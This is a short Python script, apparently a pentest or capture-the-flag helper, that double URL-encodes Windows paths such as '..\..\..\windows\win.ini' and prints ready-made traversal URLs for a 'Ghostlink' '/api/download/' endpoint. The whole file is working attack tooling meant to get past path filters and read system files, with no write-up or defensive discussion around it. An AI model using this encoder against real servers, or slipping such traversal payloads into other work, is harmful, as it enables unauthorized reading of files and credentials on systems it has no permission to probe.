#!/usr/bin/env python3
"""Double URL-encode a Windows path for Ghostlink /api/download/."""
from __future__ import annotations

import argparse
import sys


def enc(s: str) -> str:
    return "".join("%%%02X" % b for b in s.encode("ascii"))


def double(s: str) -> str:
    # %2E -> %252E style (percent sign encoded, rest left as hex digits)
    once = enc(s)
    return once.replace("%", "%25")


def main() -> int:
    p = argparse.ArgumentParser(description="Ghostlink download traversal encoder")
    p.add_argument("path", help=r"e.g. ..\..\..\windows\win.ini")
    p.add_argument("--prefix", default="/api/download/", help="URL prefix")
    args = p.parse_args()
    path = args.path
    print("raw     ", path)
    print("once    ", enc(path))
    print("double  ", double(path))
    print("url     ", args.prefix + double(path))
    return 0


if __name__ == "__main__":
    sys.exit(main())
